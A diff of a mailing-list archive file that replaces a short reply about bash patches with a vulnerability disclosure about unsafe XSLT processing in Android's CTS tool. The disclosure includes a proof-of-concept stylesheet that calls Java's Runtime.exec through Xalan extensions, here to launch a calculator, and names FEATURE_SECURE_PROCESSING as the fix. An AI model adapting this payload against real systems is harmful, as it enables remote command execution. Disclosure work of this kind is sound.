@@ -1,17 +1,55 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/09/25/37
-Message-ID: <CALx_OUDd53enEu1Y0mheiBymaWxgjOBk8+ZkiP_k7pwFi1f3cA@mail.gmail.com>
-Date: Thu, 25 Sep 2014 11:09:24 -0700
-From: Michal Zalewski <lcamtuf@...edump.cx>
-To: oss-security@...ts.openwall.com
-Cc: Chester Ramey <chet.ramey@...e.edu>
-Subject: Re: Fwd: Non-upstream patches for bash
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/10/19/1
+Message-ID: <CAGGN9efZy3Nx8X2JHpWQmH7wAdeztJ3jLF93R1f7sLFJoyShqw@mail.gmail.com>
+Date: Sun, 19 Oct 2014 19:28:33 +1000
+From: Lord Tuskington <l.tuskington@...il.com>
+To: fulldisclosure@...lists.org, oss-security@...ts.openwall.com
+Subject: CVE request: remote code execution in Android CTS
 Content-Type: text/plain; charset=utf-8
 
->> Have these been reported upstream?
-> Nope, but i just cced Chet on it now :)
+CTS parses api-coverage.xsl without providing the FEATURE_SECURE_PROCESSING
+option. See lines 60-67 of
+cts/tools/cts-api-coverage/src/com/android/cts/apicoverage/HtmlReport.java:
 
-I think that Chet was cc:ed on the original report from Todd last
-night (as was I).
+InputStream xsl =
+CtsApiCoverage.class.getResourceAsStream("/api-coverage.xsl");
+StreamSource xslSource = new StreamSource(xsl);
+TransformerFactory factory = TransformerFactory.newInstance();
+Transformer transformer = factory.newTransformer(xslSource);
 
-/mz
+StreamSource xmlSource = new StreamSource(xmlIn);
+StreamResult result = new StreamResult(out);
+transformer.transform(xmlSource, result);
+
+An attacker who is able to control api-coverage.xsl could inject arbitrary
+code into it, which would be executed. For example:
+
+<xsl:stylesheet version="1.0"
+xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
+xmlns:str="http://xml.apache.org/xalan/java/java.lang.String"
+>
+<xsl:output method="text"/>
+    <xsl:template match="/">
+       <xsl:variable name="Command"><![CDATA[calc.exe]]></xsl:variable>
+       <xsl:variable name="RT" select="rt:getRuntime()"/>
+       <xsl:variable name="proc" select="rt:exec($RT, $Command)"/>
+       <xsl:text>Process: </xsl:text><xsl:value-of select="$proc"/>
+    </xsl:template>
+</xsl:stylesheet>
+
+Would pop a calc. This crosses a trust boundary because an attacker could
+provide an XSL stylesheet that, for example, has enhanced visual layout. A
+person consuming that stylesheet would assume it could not possibly contain
+arbitrary code that would be executed, as it's just a stylesheet. The XSL
+extensions to execute code should be disabled by passing
+FEATURE_SECURE_PROCESSING.
+
+Regards
+
+Lord Tuskington
+
+Chief Financial Pinniped
+
+TuskCorp
+
